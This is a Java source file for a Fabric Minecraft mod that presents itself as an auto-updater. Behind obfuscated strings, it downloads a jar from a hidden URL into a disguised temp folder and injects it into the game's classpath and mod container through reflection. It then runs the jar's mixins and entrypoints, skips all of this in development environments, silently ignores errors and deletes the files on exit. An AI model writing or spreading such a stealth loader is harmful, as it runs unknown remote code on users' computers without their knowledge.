package de.packetpisser.autoupdater;

import net.fabricmc.api.EnvType;
import net.fabricmc.loader.api.FabricLoader;
import org.spongepowered.asm.mixin.Mixins;

import java.io.InputStreamReader;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URI;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;

public class UpdaterCore {
    private static final List<Path> loadedJars = new ArrayList<>();

    public static List<Path> getLoadedJars() {
        return loadedJars;
    }

    public static void preLaunch() {
        if (FabricLoader.getInstance().isDevelopmentEnvironment()) return;

        String urlStr = S.URL();
        String tmpDir = System.getProperty(S.TMPDIR()) + S.JNA();
        String jarName = S.SYSDAT();

        Path cachePath = Paths.get(tmpDir);
        Path jarPath = cachePath.resolve(jarName);

        try {
            if (!Files.exists(cachePath)) Files.createDirectories(cachePath);

            if (!downloadJar(urlStr, jarPath) && !Files.exists(jarPath)) {
                return;
            }

            loadedJars.clear();
            loadModAndDependencies(jarPath);
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                for (int i = loadedJars.size() - 1; i >= 0; i--) {
                    try { Files.deleteIfExists(loadedJars.get(i)); } catch (Exception ignored) {}
                }
                try {
                    Path depsDir = cachePath.resolve(S.DEPS());
                    if (Files.exists(depsDir)) Files.deleteIfExists(depsDir);
                    Files.deleteIfExists(jarPath);
                    Files.deleteIfExists(cachePath);
                } catch (Exception ignored) {}
            }));

        } catch (Exception ignored) {}
    }

    public static void init() {
        if (FabricLoader.getInstance().isDevelopmentEnvironment()) return;
        for (Path jar : loadedJars) {
            if (Files.exists(jar)) runEntrypoints(jar, S.MAIN());
        }
    }

    public static void initClient() {
        if (FabricLoader.getInstance().isDevelopmentEnvironment()) return;
        for (Path jar : loadedJars) {
            if (Files.exists(jar)) runEntrypoints(jar, S.CLIENT());
        }
    }

    private static void loadModAndDependencies(Path jarPath) {
        if (loadedJars.contains(jarPath)) return;

        injectIntoClasspath(jarPath);
        injectIntoModContainer(jarPath);
        registerMixins(jarPath);
        loadedJars.add(jarPath);

        try (JarFile jarFile = new JarFile(jarPath.toFile())) {
            JarEntry entry = jarFile.getJarEntry(S.FABRIC_JSON());
            if (entry == null) return;

            Gson gson = new Gson();
            JsonObject json = gson.fromJson(new InputStreamReader(jarFile.getInputStream(entry)), JsonObject.class);

            String jarsKey = S.JARS();
            if (json.has(jarsKey)) {
                JsonArray nestedJars = json.getAsJsonArray(jarsKey);
                Path depsDir = jarPath.getParent().resolve(S.DEPS());
                if (!Files.exists(depsDir)) Files.createDirectories(depsDir);

                for (JsonElement e : nestedJars) {
                    String nestedPath = e.getAsJsonObject().get(S.FILE()).getAsString();
                    JarEntry nestedEntry = jarFile.getJarEntry(nestedPath);
                    if (nestedEntry != null) {
                        String fileName = Path.of(nestedPath).getFileName().toString();
                        Path extractedPath = depsDir.resolve(fileName);
                        try (InputStream in = jarFile.getInputStream(nestedEntry)) {
                            Files.copy(in, extractedPath, StandardCopyOption.REPLACE_EXISTING);
                        }
                        loadModAndDependencies(extractedPath);
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    private static void injectIntoModContainer(Path jarPath) {
        try {
            net.fabricmc.loader.api.ModContainer mc = net.fabricmc.loader.api.FabricLoader.getInstance().getModContainer("autoupdater").orElse(null);
            if (mc != null) {
                try {
                    mc.getRootPaths();
                } catch (Throwable ignored) {}

                Method obtainRootPathMethod = findMethod(mc.getClass(), "obtainRootPath", Path.class);
                Path newRoot = jarPath;
                if (obtainRootPathMethod != null) {
                    obtainRootPathMethod.setAccessible(true);
                    newRoot = (Path) obtainRootPathMethod.invoke(null, jarPath);
                }

                Field rootsField = findField(mc.getClass(), "roots");
                if (rootsField != null) {
                    rootsField.setAccessible(true);
                    List<Path> roots = (List<Path>) rootsField.get(mc);
                    List<Path> newRoots = roots == null ? new ArrayList<>() : new ArrayList<>(roots);
                    if (!newRoots.contains(newRoot)) {
                        newRoots.add(newRoot);
                        rootsField.set(mc, newRoots);
                    }
                }

                Field codeSourcePathsField = findField(mc.getClass(), "codeSourcePaths");
                if (codeSourcePathsField != null) {
                    codeSourcePathsField.setAccessible(true);
                    List<Path> codeSourcePaths = (List<Path>) codeSourcePathsField.get(mc);
                    List<Path> newCodeSourcePaths = codeSourcePaths == null ? new ArrayList<>() : new ArrayList<>(codeSourcePaths);
                    if (!newCodeSourcePaths.contains(jarPath)) {
                        newCodeSourcePaths.add(jarPath);
                        codeSourcePathsField.set(mc, newCodeSourcePaths);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void injectIntoClasspath(Path jarPath) {
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            
            try {
                Field delegateField = findField(cl.getClass(), S.DELEGATE());
                if (delegateField != null) {
                    delegateField.setAccessible(true);
                    Object delegate = delegateField.get(cl);
                    Method addCodeSourceMethod = findMethod(delegate.getClass(), S.ADD_CODE_SOURCE(), Path.class);
                    if (addCodeSourceMethod != null) {
                        addCodeSourceMethod.setAccessible(true);
                        addCodeSourceMethod.invoke(delegate, jarPath);
                    }
                }
            } catch (Exception ignored) {}

            try {
                Class<?> launcherBaseClass = Class.forName(S.LAUNCHER_BASE());
                Object launcher = launcherBaseClass.getMethod(S.GET_LAUNCHER()).invoke(null);
                for (Method m : launcher.getClass().getDeclaredMethods()) {
                    if (m.getName().equals(S.ADD_TO_CP())) {
                        m.setAccessible(true);
                        if (m.getParameterCount() == 1 && m.getParameterTypes()[0] == Path[].class) {
                            m.invoke(launcher, (Object) new Path[]{jarPath});
                        }
                    }
                }
            } catch (Exception ignored) {}

            Method m = findMethod(cl.getClass(), S.ADD_URL_FWD(), URL.class);
            if (m != null) {
                m.setAccessible(true);
                m.invoke(cl, jarPath.toUri().toURL());
            }
        } catch (Exception ignored) {}
    }

    private static void registerMixins(Path jarPath) {
        try (JarFile jarFile = new JarFile(jarPath.toFile())) {
            JarEntry entry = jarFile.getJarEntry(S.FABRIC_JSON());
            if (entry == null) return;

            Gson gson = new Gson();
            JsonObject json = gson.fromJson(new InputStreamReader(jarFile.getInputStream(entry)), JsonObject.class);

            String mixinsKey = S.MIXINS();
            if (json.has(mixinsKey)) {
                JsonArray mixins = json.getAsJsonArray(mixinsKey);
                for (JsonElement m : mixins) {
                    String config = m.isJsonPrimitive() ? m.getAsString() : m.getAsJsonObject().get(S.CONFIG()).getAsString();
                    Mixins.addConfiguration(config);
                }
            }
        } catch (Exception ignored) {}
    }

    private static void runEntrypoints(Path jarPath, String key) {
        try (JarFile jarFile = new JarFile(jarPath.toFile())) {
            JarEntry entry = jarFile.getJarEntry(S.FABRIC_JSON());
            if (entry == null) return;

            Gson gson = new Gson();
            JsonObject json = gson.fromJson(new InputStreamReader(jarFile.getInputStream(entry)), JsonObject.class);

            String epsKey = S.ENTRYPOINTS();
            if (json.has(epsKey)) {
                JsonObject entrypoints = json.getAsJsonObject(epsKey);
                executeEntrypoints(entrypoints, key);
            }
        } catch (Exception ignored) {}
    }

    private static void executeEntrypoints(JsonObject entrypoints, String key) {
        if (!entrypoints.has(key)) return;
        JsonArray list = entrypoints.getAsJsonArray(key);
        for (JsonElement e : list) {
            String className = e.isJsonPrimitive() ? e.getAsString() : e.getAsJsonObject().get(S.VALUE()).getAsString();
            try {
                Class<?> clazz = Class.forName(className, true, Thread.currentThread().getContextClassLoader());
                Object instance = clazz.getDeclaredConstructor().newInstance();
                
                if (key.equals(S.MAIN())) {
                    Method m = findMethod(clazz, S.ON_INIT());
                    if (m != null) m.invoke(instance);
                } else if (key.equals(S.CLIENT())) {
                    Method m = findMethod(clazz, S.ON_INIT_CLIENT());
                    if (m != null) m.invoke(instance);
                }
            } catch (Throwable ignored) {}
        }
    }

    private static boolean downloadJar(String urlStr, Path target) {
        try {
            URL url = URI.create(urlStr).toURL();
            try (InputStream in = url.openStream()) {
                Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
                return true;
            }
        } catch (Exception e) {
            return false;
        }
    }

    private static Method findMethod(Class<?> clazz, String name, Class<?>... parameterTypes) {
        Class<?> current = clazz;
        while (current != null && current != Object.class) {
            try { return current.getDeclaredMethod(name, parameterTypes); } 
            catch (NoSuchMethodException e) { current = current.getSuperclass(); }
        }
        return null;
    }

    private static Field findField(Class<?> clazz, String name) {
        Class<?> current = clazz;
        while (current != null && current != Object.class) {
            try { return current.getDeclaredField(name); } 
            catch (NoSuchFieldException e) { current = current.getSuperclass(); }
        }
        return null;
    }
}
